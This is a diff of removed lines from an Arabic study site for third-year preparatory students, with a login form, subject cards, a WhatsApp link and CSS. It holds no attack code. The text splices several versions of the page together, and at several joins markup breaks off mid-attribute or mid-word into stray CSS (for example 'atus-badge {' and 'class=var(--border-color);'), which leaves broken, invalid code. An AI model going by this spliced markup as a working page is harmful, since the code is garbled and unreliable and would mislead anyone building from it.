-                        <p class="subject-desc">نحو الشهادة الإعدادية، قصة طموح جارية، والنصوص.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة عربية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة إنجليزية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">قواعد الوحدات، الكلمات، المحادثات، وبنك الأسئلة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة إنجليزية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">رياضيات</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">الجبر، الهندسة التحليلية، الدائرة، والنظريات الهامة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('رياضيات')">دخول المادة 📖</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="content-view" id="contentView">
-            <div class="content-header">
-                <h2 id="viewTitle" style="color:#60a5fa; font-weight:900;">اسم المادة</h2>
-                <button class="back-btn" onclick="goHome()">⬅ العودة للمواد</button>
-            </div>
-            <p style="color:var(--text-muted); font-weight:600; margin-bottom:15px;">اختر القسم المطلوب للمتابعة:</p>
-            <div class="options-grid">
-                <div class="option-card" onclick="selectSection('الملخصات')">
-                    <h4>📖 الملخصات</h4>
-                    <p>مذكرات الشرح والمراجعات النهائية PDF</p>
-                </div>
-                <div class="option-card" onclick="selectSection('الكورسات')">
-                    <h4>🎓 الكورسات</h4>
-                    <p>فيديوهات الشرح والشروحات المرئية</p>
-                </div>
-                <div class="option-card" onclick="selectSection('الامتحانات')">atus-badge {
-            background: rgba(34, 197, 94, 0.15);
-            color: var(--success);
-            border: 1px solid rgba(34, 197, 94, 0.3);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.78rem;
-            font-weight: 900;
-        }
-
-        .subject-desc {
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-            line-height: 1.6;
-        }
-
-        .subject-btn {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 112, 243, 0.15);
-            color: #60a5fa;
-            border: 1px solid rgba(0, 112, 243, 0.3);
-            border-radius: 12px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            font-size: 0.92rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .subject-btn:hover { background: var(--primary); color: white; }
-
-        .content-view, .dynamic-items-container {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .content-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
-        }
-
-        .back-btn {
-            background: var(--bg-input);
-            color: var(--text-main);
-            border: 1px solid var(--border-color);
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .option-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 25px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .option-card:hover { border-color: var(--primary); background: #1e293b; }
-        .option-card h4 { font-size: 1.15rem; font-weight: 900; color: var(--text-main); margin-bottom: 8px; }
-        .option-card p { font-size: 0.85rem; color: var(--text-muted); font-weight: 600; }
-
-        .item-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 18px 20px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .item-info h5 { font-size: 1.05rem; color: var(--text-main); font-weight: 900; margin-bottom: 4px; }
-        .item-info span { font-size: 0.85rem; color: var(--text-muted); }
-        .item-link-btn { background: var(--primary); color: white; text-decoration: none; padding: 8px 18px; border-radius: 10px; font-weight: 700; font-size: 0.88rem; }
-
-        footer {
-            text-align: center;
-            padding: 25px;
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-top: auto;
-            border-top: 1px solid var(--border-color);
-            background: rgba(13, 22, 38, 0.9);
-            font-weight: 600;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="auth-overlay" id="authOverlay" style="display: none;">
-        <div class="auth-container">
-            <div class="app-logo-badge">🎓</div>
-            <h1>الأسطورة 3إعدادي</h1>
-            <h2>منصة تعليمية متكاملة</h2>
-            <p id="authSubtitle">تعلم .. طور .. حقق مستقبلك</p>
-            
-            <div class="auth-box">
-                <div class="input-group" id="nameGroup" style="display: none;">
-                    <span class="input-icon">👤</span>
-                    <input type="text" id="authName" placeholder="الاسم بالكامل">
-                </div>
-
-                <div class="input-group">
-                    <span class="input-icon">📞</span>
-                    <input type="tel" id="authPhone" placeholder="رقم الهاتف (مثال: 010...)">
-                </div>
-                
-                <div class="input-group">
-                    <span class="input-icon">🔒</span>
-                    <input type="password" id="authPass" placeholder="كلمة المرور">
-                </div>
-
-                <button class="btn-auth" id="authBtn" onclick="submitAuth()">تسجيل الدخول</button>
-
-                <div class="auth-footer-links">
-                    <span onclick="forgotPassword()">نسيت كلمة المرور؟</span>
-                    <span id="switchText" onclick="toggleAuthMode()">إنشاء حساب جديد</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="navbar">
-        <div class="nav-brand" onclick="goHome()">🎓 الأسطورة 3إعدادي</div>
-        <div class="user-panel">
-            <span class="student-badge" id="studentBadge">زائر</span>
-            
-            <div style="position: relative;">
-                <button class="menu-btn" onclick="toggleMenu(event)">⋮</button>
-                <div class="dropdown-menu" id="dropdownMenu">
-                    <div class="dropdown-item" onclick="showProfile()">👤 الحساب الشخصي</div>
-                    <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="dropdown-item">📢 قناة الواتساب</a>
-                    <button class="dropdown-item logout" onclick="logout()">🚪 تسجيل الخروج</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="main-container">
-        <div id="homeView">
-            <div class="welcome-card">
-                <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-                <p>اختر المادة الدراسية المطلوبة لاستعراض الملخصات، الكورسات، والامتحانات</p>
-            </div>
-
-            <div class="section-title">📚 المواد الدراسية المقررة</div>
-
-            <div class="subjects-grid">
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">دراسات اجتماعية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">تاريخ العصور الحديثة، جغرافيا العالم، وتدريبات المنهج.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('دراسات اجتماعية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">علوم</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">التفاعلات الكيميائية، السرعة، التجارب، والمعادلات.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('علوم')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة عربية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">نحو الشهادة الإعدادية، قصة طموح جارية، والنصوص.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة عربية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة إنجليزية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">قواعد الوحدات، الكلمات، المحادثات، وبنك الأسئلة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة إنجليزية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">رياضيات</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">الجبر، الهندسة التحليلية، الدائرة، والنظريات الهامة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('رياضيات')">دخول المادة 📖</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="content-view" id="contentView">
-            <div class="content-header">
-                <h2 id="viewTitle" style="color:#60a5fa; font-weight:900;">اسم المادة</h2>
-                <button class="back-btn" onclick="goHome()">⬅ العودة للمواد</button>
-            </div>
-            <p style="color:var(--text-muted); font-weight:600; margin-bottom:15px;">اختر القسم المطلوب للمتابعة:</p>
-            <div class="options-grid">
-                <div class="option-card" onclick="selectSection('الملخصات')">
-                    <h4>📖 الملخصات</h4>
-                    <p>مذكرات الشرح والمراجعات النهائية PDF</p>
-                </div>
-                <div class="option-card" onclick="selectSection('الكورسات')">
-                    <h4>🎓 الكورسات</h4>
-                    <p>فيديوهات الشرح والشروحات المرئية</p>
-                </div>
-                <div class="option-card" onclick="selectSection('الامتحانات')">24px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-        }
-
-        .subject-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 112, 243, 0.2);
-            border-color: var(--primary);
-        }
-
-        .subject-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-        }
-
-        .subject-title {
-            font-size: 1.15rem;
-            font-weight: 900;
-            color: var(--text-main);
-        }
-
-        .status-badge {
-            background: rgba(34, 197, 94, 0.15);
-            color: var(--success);
-            border: 1px solid rgba(34, 197, 94, 0.3);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.78rem;
-            font-weight: 900;
-        }
-
-        .subject-desc {
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-            line-height: 1.6;
-        }
-
-        .subject-btn {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 112, 243, 0.15);
-            color: #60a5fa;
-            border: 1px solid rgba(0, 112, 243, 0.3);
-            border-radius: 12px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            font-size: 0.92rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .subject-btn:hover { background: var(--primary); color: white; }
-
-        .content-view {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .content-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
-        }
-
-        .back-btn {
-            background: var(--bg-input);
-            color: var(--text-main);
-            border: 1px solid var(--border-color);
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .back-btn:hover { background: #1e293b; }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .option-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 25px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .option-card:hover {
-            border-color: var(--primary);
-            background: #1e293b;
-            transform: translateY(-3px);
-        }
-
-        .option-card h4 { font-size: 1.15rem; font-weight: 900; color: var(--text-main); margin-bottom: 8px; }
-        .option-card p { font-size: 0.85rem; color: var(--text-muted); font-weight: 600; }
-
-        .dynamic-items-container {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .item-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 18px 20px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.2s;
-        }
-
-        .item-card:hover { border-color: var(--primary); }
-        .item-info h5 { font-size: 1.05rem; color: var(--text-main); font-weight: 900; margin-bottom: 4px; }
-        .item-info span { font-size: 0.85rem; color: var(--text-muted); }
-        .item-link-btn { background: var(--primary); color: white; text-decoration: none; padding: 8px 18px; border-radius: 10px; font-weight: 700; font-size: 0.88rem; transition: background 0.2s; }
-        .item-link-btn:hover { background: var(--primary-hover); }
-
-        footer {
-            text-align: center;
-            padding: 25px;
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-top: auto;
-            border-top: 1px solid var(--border-color);
-            background: rgba(13, 22, 38, 0.9);
-            font-weight: 600;
-        }
-    </style>
-</head>
-<body>
-
-    <!-- نافذة تسجيل الدخول / إنشاء حساب (تظهر فقط عند عدم التسجيل) -->
-    <div class="auth-overlay" id="authOverlay">
-        <div class="auth-container">
-            <div class="app-logo-badge">🎓</div>
-            <h1>الصف الثالث الإعدادي</h1>
-            <h2>منصة تعليمية متكاملة</h2>
-            <p id="authSubtitle">تعلم .. طور .. حقق مستقبلك</p>
-            
-            <div class="auth-box">
-                <div class="input-group" id="nameGroup" style="display: none;">
-                    <span class="input-icon">👤</span>
-                    <input type="text" id="authName" placeholder="الاسم بالكامل">
-                </div>
-
-                <div class="input-group">
-                    <span class="input-icon">📞</span>
-                    <input type="tel" id="authPhone" placeholder="رقم الهاتف (مثال: 010...)">
-                </div>
-                
-                <div class="input-group">
-                    <span class="input-icon">🔒</span>
-                    <input type="password" id="authPass" placeholder="كلمة المرور">
-                </div>
-
-                <button class="btn-auth" id="authBtn" onclick="submitAuth()">تسجيل الدخول</button>
-
-                <div class="auth-footer-links">
-                    <span onclick="alert('تواصل مع أدمن المنصة لإعادة تعيين كلمة المرور عبر التليجرام!')">نسيت كلمة المرور؟</span>
-                    <span id="switchText" onclick="toggleAuthMode()">إنشاء حساب جديد</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- الشريط العلوي -->
-    <div class="navbar">
-        <div class="nav-brand" onclick="goHome()">🎓 ملخصات 3 إعدادي</div>
-        <div class="user-panel">
-            <span class="student-badge" id="studentBadge">زائر</span>
-            
-            <div style="position: relative;">
-                <button class="menu-btn" onclick="toggleMenu(event)">⋮</button>
-                <div class="dropdown-menu" id="dropdownMenu">
-                    <div class="dropdown-item" onclick="showProfile()">👤 الحساب الشخصي</div>
-                    <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="dropdown-item">📢 قناة الواتساب</a>
-                    <button class="dropdown-item logout" onclick="logout()">🚪 تسجيل الخروج</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- المحتوى الرئيسي -->
-    <div class="main-container">
-        
-        <div id="homeView">
-            <div class="welcome-card">
-                <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-                <p>اختر المادة الدراسية المطلوبة لاستعراض الملخصات، الكورسات، والامتحانات</p>
-            </div>
-
-            <div class="section-title">📚 المواد الدراسية المقررة</div>
-
-            <div class="subjects-grid">
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">دراسات اجتماعية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">تاريخ العصور الحديثة، جغرافيا العالم، وتدريبات المنهج.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('دراسات اجتماعية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">علوم</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">التفاعلات الكيميائية، السرعة، التجارب، والمعادلات.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('علوم')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة عربية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">نحو الشهادة الإعدادية، قصة طموح جارية، والنصوص.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة عربية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة إنجليزية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">قواعد الوحدات، الكلمات، المحادثات، وبنك الأسئلة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة إنجليزية')">دخول المادة 📖</button>
-                </div>
-
-                <div class=var(--border-color);
-            border-radius: 18px;
-            padding: 24px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-        }
-
-        .subject-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 112, 243, 0.2);
-            border-color: var(--primary);
-        }
-
-        .subject-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-        }
-
-        .subject-title {
-            font-size: 1.15rem;
-            font-weight: 900;
-            color: var(--text-main);
-        }
-
-        .status-badge {
-            background: rgba(34, 197, 94, 0.15);
-            color: var(--success);
-            border: 1px solid rgba(34, 197, 94, 0.3);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.78rem;
-            font-weight: 900;
-        }
-
-        .subject-desc {
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-            line-height: 1.6;
-        }
-
-        .subject-btn {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 112, 243, 0.15);
-            color: #60a5fa;
-            border: 1px solid rgba(0, 112, 243, 0.3);
-            border-radius: 12px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            font-size: 0.92rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .subject-btn:hover { background: var(--primary); color: white; }
-
-        .content-view {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .content-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
-        }
-
-        .back-btn {
-            background: var(--bg-input);
-            color: var(--text-main);
-            border: 1px solid var(--border-color);
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .back-btn:hover { background: #1e293b; }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .option-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 25px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .option-card:hover {
-            border-color: var(--primary);
-            background: #1e293b;
-            transform: translateY(-3px);
-        }
-
-        .option-card h4 { font-size: 1.15rem; font-weight: 900; color: var(--text-main); margin-bottom: 8px; }
-        .option-card p { font-size: 0.85rem; color: var(--text-muted); font-weight: 600; }
-
-        .dynamic-items-container {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .item-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 18px 20px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.2s;
-        }
-
-        .item-card:hover { border-color: var(--primary); }
-        .item-info h5 { font-size: 1.05rem; color: var(--text-main); font-weight: 900; margin-bottom: 4px; }
-        .item-info span { font-size: 0.85rem; color: var(--text-muted); }
-        .item-link-btn { background: var(--primary); color: white; text-decoration: none; padding: 8px 18px; border-radius: 10px; font-weight: 700; font-size: 0.88rem; transition: background 0.2s; }
-        .item-link-btn:hover { background: var(--primary-hover); }
-
-        footer {
-            text-align: center;
-            padding: 25px;
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-top: auto;
-            border-top: 1px solid var(--border-color);
-            background: rgba(13, 22, 38, 0.9);
-            font-weight: 600;
-        }
-    </style>
-</head>
-<body>
-
-    <!-- نافذة تسجيل الدخول / إنشاء حساب بالتصميم الفخم -->
-    <div class="auth-overlay" id="authOverlay" style="display: none;">
-        <div class="auth-container">
-            <div class="app-logo-badge">🎓</div>
-            <h1>الصف الثالث الإعدادي</h1>
-            <h2>منصة تعليمية متكاملة</h2>
-            <p id="authSubtitle">تعلم .. طور .. حقق مستقبلك</p>
-            
-            <div class="auth-box">
-                <div class="input-group" id="nameGroup" style="display: none;">
-                    <span class="input-icon">👤</span>
-                    <input type="text" id="authName" placeholder="الاسم بالكامل">
-                </div>
-
-                <div class="input-group">
-                    <span class="input-icon">📞</span>
-                    <input type="tel" id="authPhone" placeholder="رقم الهاتف (مثال: 010...)">
-                </div>
-                
-                <div class="input-group">
-                    <span class="input-icon">🔒</span>
-                    <input type="password" id="authPass" placeholder="كلمة المرور">
-                </div>
-
-                <button class="btn-auth" id="authBtn" onclick="submitAuth()">تسجيل الدخول</button>
-
-                <div class="auth-footer-links">
-                    <span onclick="alert('تواصل مع أدمن المنصة لإعادة تعيين كلمة المرور عبر التليجرام!')">نسيت كلمة المرور؟</span>
-                    <span id="switchText" onclick="toggleAuthMode()">إنشاء حساب جديد</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- الشريط العلوي -->
-    <div class="navbar">
-        <div class="nav-brand" onclick="goHome()">🎓 ملخصات 3 إعدادي</div>
-        <div class="user-panel">
-            <span class="student-badge" id="studentBadge">زائر</span>
-            
-            <div style="position: relative;">
-                <button class="menu-btn" onclick="toggleMenu(event)">⋮</button>
-                <div class="dropdown-menu" id="dropdownMenu">
-                    <div class="dropdown-item" onclick="showProfile()">👤 الحساب الشخصي</div>
-                    <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="dropdown-item">📢 قناة الواتساب</a>
-                    <button class="dropdown-item logout" onclick="logout()">🚪 تسجيل الخروج</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- المحتوى الرئيسي -->
-    <div class="main-container">
-        
-        <div id="homeView">
-            <div class="welcome-card">
-                <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-                <p>اختر المادة الدراسية المطلوبة لاستعراض الملخصات، الكورسات، والامتحانات</p>
-            </div>
-
-            <div class="section-title">📚 المواد الدراسية المقررة</div>
-
-            <div class="subjects-grid">
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">دراسات اجتماعية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">تاريخ العصور الحديثة، جغرافيا العالم، وتدريبات المنهج.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('دراسات اجتماعية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">علوم</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">التفاعلات الكيميائية، السرعة، التجارب، والمعادلات.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('علوم')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة عربية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">نحو الشهادة الإعدادية، قصة طموح جارية، والنصوص.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة عربية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة إنجليزية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">قواعد الوحدات، الكلمات، المحادثات، وبنك الأسئلة.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('لغة إsc {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-            line-height: 1.6;
-        }
-
-        .subject-btn {
-            width: 100%;
-            padding: 12px;
-            background: rgba(59, 130, 246, 0.15);
-            color: var(--primary-hover);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            border-radius: 10px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            font-size: 0.95rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .subject-btn:hover { background: var(--primary); color: white; }
-
-        .content-view {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4);
-        }
-
-        .content-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
-        }
-
-        .back-btn {
-            background: var(--bg-input);
-            color: var(--text-main);
-            border: 1px solid var(--border-color);
-            padding: 8px 16px;
-            border-radius: 8px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .back-btn:hover { background: #1e293b; }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .option-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 25px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .option-card:hover {
-            border-color: var(--primary);
-            background: #1e293b;
-            transform: translateY(-3px);
-        }
-
-        .option-card h4 { font-size: 1.15rem; font-weight: 900; color: var(--text-main); margin-bottom: 8px; }
-        .option-card p { font-size: 0.88rem; color: var(--text-muted); font-weight: 600; }
-
-        .dynamic-items-container {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4);
-        }
-
-        .item-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 18px 20px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.2s;
-        }
-
-        .item-card:hover { border-color: var(--primary); }
-        .item-info h5 { font-size: 1.1rem; color: var(--text-main); font-weight: 900; margin-bottom: 4px; }
-        .item-info span { font-size: 0.85rem; color: var(--text-muted); }
-        .item-link-btn { background: var(--primary); color: white; text-decoration: none; padding: 8px 18px; border-radius: 8px; font-weight: 700; font-size: 0.9rem; transition: background 0.2s; }
-        .item-link-btn:hover { background: var(--primary-hover); }
-
-        footer {
-            text-align: center;
-            padding: 25px;
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            margin-top: auto;
-            border-top: 1px solid var(--border-color);
-            background: var(--bg-card);
-            font-weight: 600;
-        }
-    </style>
-</head>
-<body>
-
-    <!-- نافذة تسجيل الدخول / إنشاء حساب -->
-    <div class="auth-overlay" id="authOverlay" style="display: none;">
-        <div class="auth-box">
-            <h2 id="authTitle">تسجيل الدخول 🔑</h2>
-            <p id="authSubtitle">أدخل رقم الهاتف وكلمة المرور للمتابعة</p>
-            
-            <div class="input-group" id="nameGroup" style="display: none;">
-                <label>الاسم بالكامل:</label>
-                <input type="text" id="authName" placeholder="مثال: علي شعبان">
-            </div>
-
-            <div class="input-group">
-                <label>رقم الهاتف:</label>
-                <input type="tel" id="authPhone" placeholder="01012345678">
-            </div>
-            
-            <div class="input-group">
-                <label>كلمة المرور:</label>
-                <input type="password" id="authPass" placeholder="••••••••">
-            </div>
-
-            <button class="btn-auth" id="authBtn" onclick="submitAuth()">دخول المنصة 🚀</button>
-
-            <div class="switch-auth">
-                <span id="switchText" onclick="toggleAuthMode()">ليس لديك حساب؟ إنشاء حساب جديد</span>
-            </div>
-        </div>
-    </div>
-
-    <!-- الشريط العلوي -->
-    <div class="navbar">
-        <div class="nav-brand" onclick="goHome()">🎓 منصة ملخصات 3 إعدادي</div>
-        <div class="user-panel">
-            <span class="student-badge" id="studentBadge">زائر</span>
-            
-            <div style="position: relative;">
-                <button class="menu-btn" onclick="toggleMenu(event)">⋮</button>
-                <div class="dropdown-menu" id="dropdownMenu">
-                    <div class="dropdown-item" onclick="showProfile()">👤 الحساب الشخصي</div>
-                    <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="dropdown-item">📢 رابط قناة الواتساب</a>
-                    <button class="dropdown-item logout" onclick="logout()">🚪 تسجيل الخروج</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- المحتوى الرئيسي -->
-    <div class="main-container">
-        
-        <div id="homeView">
-            <div class="welcome-card">
